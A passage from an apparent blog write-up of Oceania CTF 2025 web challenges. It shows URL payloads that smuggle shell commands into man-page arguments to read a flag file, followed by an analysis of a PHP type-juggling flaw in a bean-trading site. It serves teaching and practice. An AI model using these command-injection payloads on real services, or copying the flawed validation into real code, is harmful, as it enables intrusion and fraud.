+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">http://challenges.oceaniacc.com:5001/;/--html=%22$(echo%20&amp;#39;L2ZsYWcudHh0&amp;#39;|base64%20-d)%22/man
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>Decoded URL:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">http://challenges.oceaniacc.com:5001/;/--html=&amp;#34;$(echo &amp;#39;L2ZsYWcudHh0&amp;#39;|base64 -d)&amp;#34;/man
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>One thing I tried with this payload is without the pipe character. So something like this would work if the &lt;code>bash&lt;/code> shell was used:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">$(base64 -d &amp;lt;&amp;lt;&amp;lt; &amp;#39;L2ZsYWcudHh0&amp;#39;)
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>However, this redirection operator doesn&amp;rsquo;t work on &lt;code>sh&lt;/code> which means it won&amp;rsquo;t on this challenge.&lt;/p>
+&lt;p>Additionally, I wanted to highlight the use of the command substitution to print the flag in the error message rather than printing to &lt;code>stdout&lt;/code> is very creative. However, this only works because the executable bit is set for the &lt;code>flag.txt&lt;/code> file.&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;span class="lnt">4
+&lt;/span>&lt;span class="lnt">5
+&lt;/span>&lt;span class="lnt">6
+&lt;/span>&lt;span class="lnt">7
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-sh" data-lang="sh">&lt;span class="line">&lt;span class="cl">$ ls -l /flag.txt
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">-rw-r--r-- &lt;span class="m">1&lt;/span> root root &lt;span class="m">12&lt;/span> Feb &lt;span class="m">8&lt;/span> 18:14 /flag.txt
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">$ /flag.txt
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">sh: 11: /flag.txt: Permission denied
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">$ sudo chmod +x /flag.txt
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">$ /flag.txt
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">/flag.txt: 1: oicc&lt;span class="o">{&lt;/span>hello&lt;span class="o">}&lt;/span>: not found
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>If stderr is not outputted or the executable bit is not set, I would make the payload like this:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">http://challenges.oceaniacc.com:5001/;/--html=cat%20$(echo%20&amp;#39;L2ZsYWcudHh0&amp;#39;|base64%20-d)/man
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>URL decoded:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">http://challenges.oceaniacc.com:5001/;/--html=cat $(echo &amp;#39;L2ZsYWcudHh0&amp;#39;|base64 -d)/man
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>Note a very interesting behaviour between the two payloads:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">http://challenges.oceaniacc.com:5001/;/--html=%22cat%20$(echo%20&amp;#39;L2ZsYWcudHh0&amp;#39;|base64%20-d)%22/man
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>&lt;img src="https://www.solopie.com/p/team-oceania-ctf-qualifiers-2025-writeups/images/manic/base64_payload_stdout_output_1.png"
+width="1009"
+height="242"
+srcset="https://www.solopie.com/p/team-oceania-ctf-qualifiers-2025-writeups/images/manic/base64_payload_stdout_output_1_hu_285fe55bc5f7092c.png 480w, https://www.solopie.com/p/team-oceania-ctf-qualifiers-2025-writeups/images/manic/base64_payload_stdout_output_1_hu_b1b8fad3fa35bb06.png 1024w"
+loading="lazy"
+alt="Base64 Payload Stdout 1"
+class="gallery-image"
+data-flex-grow="416"
+data-flex-basis="1000px"
+>&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">http://challenges.oceaniacc.com:5001/;/--html=cat%20$(echo%20&amp;#39;L2ZsYWcudHh0&amp;#39;|base64%20-d)/man
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>&lt;img src="https://www.solopie.com/p/team-oceania-ctf-qualifiers-2025-writeups/images/manic/base64_payload_stdout_output_2.png"
+width="913"
+height="288"
+srcset="https://www.solopie.com/p/team-oceania-ctf-qualifiers-2025-writeups/images/manic/base64_payload_stdout_output_2_hu_f1b80f26a6a18bc3.png 480w, https://www.solopie.com/p/team-oceania-ctf-qualifiers-2025-writeups/images/manic/base64_payload_stdout_output_2_hu_6c6e189fc3c73a9d.png 1024w"
+loading="lazy"
+alt="Base64 Payload Stdout 2"
+class="gallery-image"
+data-flex-grow="317"
+data-flex-basis="760px"
+>&lt;/p>
+&lt;p>The difference is that the value for the &lt;code>--html&lt;/code> argument is wrapped with double quotes. When wrapped with double quotes, the payload does not work. This is because when wrapping the initial command in a shell with double quotes, it will include the spaces as a part of the binary that it&amp;rsquo;s searching for to execute.&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;span class="lnt">4
+&lt;/span>&lt;span class="lnt">5
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-sh" data-lang="sh">&lt;span class="line">&lt;span class="cl">$ &lt;span class="s2">&amp;#34;ls -l&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">sh: 15: ls -l: not found
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">$ ls -l
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">total &lt;span class="m">12&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">-rw-r--r-- &lt;span class="m">1&lt;/span> solopie solopie &lt;span class="m">89&lt;/span> Jan &lt;span class="m">14&lt;/span> 22:51 README.m
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;h5 id="bruh">Bruh
+&lt;/h5>&lt;p>I found this one funny for some reason. The one thing I love about CTFs is that sometimes you&amp;rsquo;ll find a solution that seems very obvious but completely crosses your mind. No need for fancy expansions!&lt;/p>
+&lt;p>&lt;img src="https://www.solopie.com/p/team-oceania-ctf-qualifiers-2025-writeups/images/manic/bruh_payload_2.png"
+width="900"
+height="68"
+srcset="https://www.solopie.com/p/team-oceania-ctf-qualifiers-2025-writeups/images/manic/bruh_payload_2_hu_187fc7ee1ff29b3c.png 480w, https://www.solopie.com/p/team-oceania-ctf-qualifiers-2025-writeups/images/manic/bruh_payload_2_hu_141a2133ed858341.png 1024w"
+loading="lazy"
+alt="Bruh Payload 2"
+class="gallery-image"
+data-flex-grow="1323"
+data-flex-basis="3176px"
+>&lt;/p>
+&lt;p>&lt;img src="https://www.solopie.com/p/team-oceania-ctf-qualifiers-2025-writeups/images/manic/bruh_payload.png"
+width="722"
+height="91"
+srcset="https://www.solopie.com/p/team-oceania-ctf-qualifiers-2025-writeups/images/manic/bruh_payload_hu_ddcfc3da1e892aeb.png 480w, https://www.solopie.com/p/team-oceania-ctf-qualifiers-2025-writeups/images/manic/bruh_payload_hu_a66f79d2f63dc080.png 1024w"
+loading="lazy"
+alt="Bruh Payload"
+class="gallery-image"
+data-flex-grow="793"
+data-flex-basis="1904px"
+>&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">http://challenges.oceaniacc.com:5001/-/-Hcd%20..%26%26cat%20flag.txt/-/man
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>Decoded URL:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">http://challenges.oceaniacc.com:5001/-/-Hcd ..&amp;amp;&amp;amp;cat flag.txt/-/man
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>Traverse to parent directory and read the flag&amp;hellip; As simple as it can get (as far as I know)!&lt;/p>
+&lt;p>&lt;img src="https://www.solopie.com/p/team-oceania-ctf-qualifiers-2025-writeups/images/manic/bruh_payload_output.png"
+width="954"
+height="285"
+srcset="https://www.solopie.com/p/team-oceania-ctf-qualifiers-2025-writeups/images/manic/bruh_payload_output_hu_ebfb59ccded90542.png 480w, https://www.solopie.com/p/team-oceania-ctf-qualifiers-2025-writeups/images/manic/bruh_payload_output_hu_b25eb6cd08fa3164.png 1024w"
+loading="lazy"
+alt="Bruh Payload Output"
+class="gallery-image"
+data-flex-grow="334"
+data-flex-basis="803px"
+>&lt;/p>
+&lt;p>Sorry if I missed out on any other payloads. Feel free to let me know of any other ideas in the comments and I&amp;rsquo;ll add them in if they work!&lt;/p>
+&lt;h4 id="post-challenge-thoughts">Post challenge thoughts
+&lt;/h4>&lt;p>The reason why I couldn&amp;rsquo;t solve this challenge was due to my methodology when enumerating what arguments I could abuse. I lacked the experience to identify certain characteristics of arguments that would achieve the objective of reading the flag. In order to improve in this aspect, I have developed a blog to explore enumerating a binary&amp;rsquo;s options and identifying potential risks to arguments in binaries &lt;a class="link" href="" >here (WIP)&lt;/a>.&lt;/p>
+&lt;h2 id="beans-230">beans (230)
+&lt;/h2>&lt;h3 id="description-1">Description
+&lt;/h3>&lt;p>Some people made their money in tech, I made it in beans&lt;/p>
+&lt;p>&lt;a class="link" href="http://challenges.oceaniacc.com:5002" target="_blank" rel="noopener"
+>http://challenges.oceaniacc.com:5002&lt;/a>&lt;/p>
+&lt;h3 id="attachments-1">Attachments
+&lt;/h3>&lt;p>&lt;a class="link" href="https://github.com/AustICCQuals/Challenges2025/raw/refs/heads/main/web/beans/publish/src-beans.tar.gz" target="_blank" rel="noopener"
+>src-beans.tar.gz&lt;/a>&lt;/p>
+&lt;h3 id="writeup-1">Writeup
+&lt;/h3>&lt;blockquote>
+&lt;p>DISCLAIMER: I wasn&amp;rsquo;t able to look at this challenge during the CTF duration, however, I decided to give it a crack without look at the solution first so I could document my thought process.&lt;/p>&lt;/blockquote>
+&lt;h4 id="background-1">Background
+&lt;/h4>&lt;p>&lt;img src="https://www.solopie.com/images/beans/bean_trader_site.png"
+loading="lazy"
+alt="Bean Trader Site"
+>&lt;/p>
+&lt;p>We are presented with a simple commerce site that allows us to buy and sell beans. We start with 100 bucks and 0 beans and with each bean having the value of 25 dollars. When attempting to press the &lt;code>Get Flag&lt;/code> button, we are presented with the message &lt;code>You need 1337 money for the flag&lt;/code>. Logically, we can&amp;rsquo;t profit since selling is the same price as buying. Therefore, we need to find a bypass for the &lt;code>amt&lt;/code> variable that would let us sell more than we have to obtain more money.&lt;/p>
+&lt;p>Let&amp;rsquo;s take a deep dive into the code!&lt;/p>
+&lt;h4 id="php-type-juggling-behaviour-shenanigans">PHP Type Juggling Behaviour Shenanigans
+&lt;/h4>&lt;p>We first decompress the source code archive:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">tar xvf src-beans.tar.gz
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>I want to specifically look at the sell function because the buy function isn&amp;rsquo;t going to get me more money.&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;span class="lnt">13
+&lt;/span>&lt;span class="lnt">14
+&lt;/span>&lt;span class="lnt">15
+&lt;/span>&lt;span class="lnt">16
+&lt;/span>&lt;span class="lnt">17
+&lt;/span>&lt;span class="lnt">18
+&lt;/span>&lt;span class="lnt">19
+&lt;/span>&lt;span class="lnt">20
+&lt;/span>&lt;span class="lnt">21
+&lt;/span>&lt;span class="lnt">22
+&lt;/span>&lt;span class="lnt">23
+&lt;/span>&lt;span class="lnt">24
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-php" data-lang="php">&lt;span class="line">&lt;span class="cl">&lt;span class="k">function&lt;/span> &lt;span class="nf">validate_integer&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$s&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="nx">ctype_digit&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">trim&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$s&lt;/span>&lt;span class="p">));&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">...&lt;/span> &lt;span class="nx">SNIPPED&lt;/span> &lt;span class="o">...&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">case&lt;/span> &lt;span class="s1">&amp;#39;sell&amp;#39;&lt;/span>&lt;span class="o">:&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nv">$amt&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nv">$_REQUEST&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s1">&amp;#39;amt&amp;#39;&lt;/span>&lt;span class="p">];&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="o">!&lt;/span>&lt;span class="nx">validate_integer&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$amt&lt;/span>&lt;span class="p">))&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nv">$error_msg&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s2">&amp;#34;That amount isn&amp;#39;t valid!&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">break&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nv">$amt&lt;/span> &lt;span class="o">&amp;lt;&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nv">$error_msg&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s2">&amp;#34;You can&amp;#39;t sell negative beans!&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">break&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nv">$_SESSION&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s1">&amp;#39;beans&amp;#39;&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">&amp;lt;&lt;/span> &lt;span class="nv">$amt&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nv">$error_msg&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s2">&amp;#34;You don&amp;#39;t have that many beans to sell!&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">break&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nv">$_SESSION&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s1">&amp;#39;beans&amp;#39;&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">-=&lt;/span> &lt;span class="nv">$amt&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nv">$_SESSION&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s1">&amp;#39;money&amp;#39;&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">+=&lt;/span> &lt;span class="nv">$amt&lt;/span> &lt;span class="o">*&lt;/span> &lt;span class="nx">BEAN_COST&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nv">$success_msg&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s2">&amp;#34;Sold &lt;/span>&lt;span class="si">$amt&lt;/span>&lt;span class="s2"> beans.&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">break&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>We observe the user-defined function &lt;code>validate_integer&lt;/code> which is used to check if the &lt;code>amt&lt;/code> variable is an integer. If the function indicates that it is not an integer, then an error is thrown. Looking at how the validation function works, there is an interesting quirk to it. It uses the &lt;code>trim&lt;/code> function to get rid of whitespaces before checking if the input is a number. Technically, this means that any number with whitespaces is still considered valid.&lt;/p>
+&lt;p>As an example, I show that numbers that contain spaces before and after are considered valid:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;span class="lnt">4
+&lt;/span>&lt;span class="lnt">5
+&lt;/span>&lt;span class="lnt">6
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-php" data-lang="php">&lt;span class="line">&lt;span class="cl">&lt;span class="nx">php&lt;/span> &lt;span class="o">&amp;gt;&lt;/span> &lt;span class="k">echo&lt;/span> &lt;span class="nx">var_dump&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">validate_integer&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;100&amp;#34;&lt;/span>&lt;span class="p">));&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">bool&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="k">true&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">php&lt;/span> &lt;span class="o">&amp;gt;&lt;/span> &lt;span class="k">echo&lt;/span> &lt;span class="nx">var_dump&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">validate_integer&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;100 &amp;#34;&lt;/span>&lt;span class="p">));&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">bool&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="k">true&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">php&lt;/span> &lt;span class="o">&amp;gt;&lt;/span> &lt;span class="k">echo&lt;/span> &lt;span class="nx">var_dump&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">validate_integer&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34; 100 &amp;#34;&lt;/span>&lt;span class="p">));&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">bool&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="k">true&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>How could we potentially use this behaviour?&lt;/p>
+&lt;p>Later in the sell functionality, we observe the conditional expression that checks if we have enough beans to sell. Remember our objective is to sell more beans than we actually have.&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-php" data-lang="php">&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nv">$_SESSION&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s1">&amp;#39;beans&amp;#39;&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">&amp;lt;&lt;/span> &lt;span class="nv">$amt&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>In PHP, there is a feature called type juggling that allows comparisons between different types by attempting to convert them into one or the other.&lt;/p>
+&lt;p>Let&amp;rsquo;s explore the behaviour for the less than sign (&amp;lt;):&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;span class="lnt">4
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-php" data-lang="php">&lt;span class="line">&lt;span class="cl">&lt;span class="nx">php&lt;/span> &lt;span class="o">&amp;gt;&lt;/span> &lt;span class="k">echo&lt;/span> &lt;span class="nx">var_dump&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="o">&amp;lt;&lt;/span>&lt;span class="s2">&amp;#34;1a&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">bool&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="k">true&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">php&lt;/span> &lt;span class="o">&amp;gt;&lt;/span> &lt;span class="k">echo&lt;/span> &lt;span class="nx">var_dump&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="o">&amp;lt;&lt;/span>&lt;span class="s2">&amp;#34;1a&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">bool&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="k">false&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>When comparing an integer with a string with the less than sign, what happens here is that the integer is converted to a string, and it is compared in alphabetical order. This is interesting to us because if you only observe the integers for the 1st comparison &lt;code>1&amp;lt;&amp;quot;1a&amp;quot;&lt;/code>, by including a non-digit in our string, in the context of the application there will be a logical error as the expected result for &lt;code>1&amp;lt;1&lt;/code> is false. This occurs as both values are compared by alphabetical order.&lt;/p>
+&lt;p>Consider this comparison:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
